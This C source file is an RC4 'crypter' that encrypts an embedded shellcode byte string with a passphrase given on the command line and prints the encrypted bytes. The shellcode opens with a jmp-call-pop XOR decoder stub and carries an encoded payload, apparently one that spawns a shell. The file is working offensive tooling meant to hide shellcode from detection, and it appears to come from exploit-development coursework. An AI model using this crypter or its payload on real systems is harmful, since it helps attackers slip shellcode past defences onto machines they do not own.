/**
	File: RC4_crytper.c

	input: arg[1] --> passphrase key

*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>


#define ARRAY_LENGTH	256				// macro definition of array length to be 256 for 256 byte of possible keysize/length



unsigned char keystream[ARRAY_LENGTH];			// defining globals
int rc4_i;						// includes the key array, and two internal counters, rc4_i and rc4_j
int rc4_j;	


// shellcode to be encrypted 
unsigned char shellcode[] = \
"\xeb\x09\x5e\x80\x36\xaa\x74\x08\x46\xeb\xf8\xe8\xf2\xff\xff\xff\x9b\x6a\xfa\xc2\xc4\x85\xd9\xc2\xc2\x85\x85\xc8\xc3\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a\xaa";




void swap(unsigned char* ks1, unsigned char* ks2);
void RC4_init(void);
void RC4_KSA(unsigned char* key, int key_length);
int RC4_PRNG(void);

int main(int argc, char** argv)
{
	unsigned char* encryption_key;			// variable declaration
	int encryption_key_length;

	unsigned char data_byte;
	unsigned char keystream_byte;
	unsigned char encrypted_byte;

	int shellcode_len;
	int counter;

	encryption_key = (unsigned char*)argv[1];			// type casted unsigned char string for first argv[1] from stdin
	encryption_key_length = strlen( (char*)encryption_key );	// type chasted char string to use strlen 

	if (encryption_key_length > ARRAY_LENGTH)
	{
		printf("[!] Key too big. Should be <= 256 characters.\n\n");	
		printf("[!] Exiting...\n");
		exit(-1);						// error code -1 for too big of key input
	}

	RC4_init();							// initialize RC4 key array
	
	RC4_KSA(encryption_key, encryption_key_length);			// scrambles key array

	shellcode_len = strlen( (char*)shellcode );

	for (counter = 0; counter < shellcode_len; counter++)		// encrypt each byte
	{
		data_byte = shellcode[counter];				// obtain a shellcode byte
		keystream_byte = RC4_PRNG();				// obtain a keystream byte
	
		encrypted_byte = data_byte ^ keystream_byte;		// obtain encrypted byte by XOR of the two previous bytes
		
		printf("\\x%02x", encrypted_byte);			// output to screen, NOTE: no new line at the end, we want the entire str
	}

	printf("\n\n\n[*] Exiting...\n\n\n");

	return 10;							// lets test if this is the exit status number

}


void RC4_init(void)
{
	int i;
	
	for (i = 0; i < ARRAY_LENGTH; i++)				// initialize keystream array in sequential order, ie 0,1,2,3,4...255
		keystream[i] = i;
	
	rc4_i = rc4_j = 0;						// initalize rc4 counters
}

void RC4_KSA(unsigned char* key, int key_length)			// scrambles they keystream array using the following
{
	for (rc4_i = 0; rc4_i < ARRAY_LENGTH; rc4_i++)
	{
		rc4_j = (rc4_j + keystream[rc4_i] + key[rc4_i % key_length]) % ARRAY_LENGTH;
		swap(&keystream[rc4_i], &keystream[rc4_j]);
	}
	
	rc4_i = rc4_j = 0;						// reset rc4 counters for the PRNG function

}

int RC4_PRNG(void)
{
	rc4_i = (rc4_i + 1) % ARRAY_LENGTH;				// everytime this is called, rc4_i increases by 1, up to 255
	rc4_j = (rc4_j + keystream[rc4_i]) % ARRAY_LENGTH;

	swap(&keystream[rc4_i], &keystream[rc4_j]);			// more scrambling

									// returning a value from keystream to be xored with data
									// this value is taken after the second scrambling done above
	return keystream[ ( keystream[rc4_i] + keystream[rc4_j] ) % ARRAY_LENGTH ];
				
}

void swap(unsigned char* ks1, unsigned char* ks2)
{
	char temp = *ks1;						// deferences ks1 and put it into temp var
	
	*ks1 = *ks2;							// swaping the values

	*ks2 = temp;

}


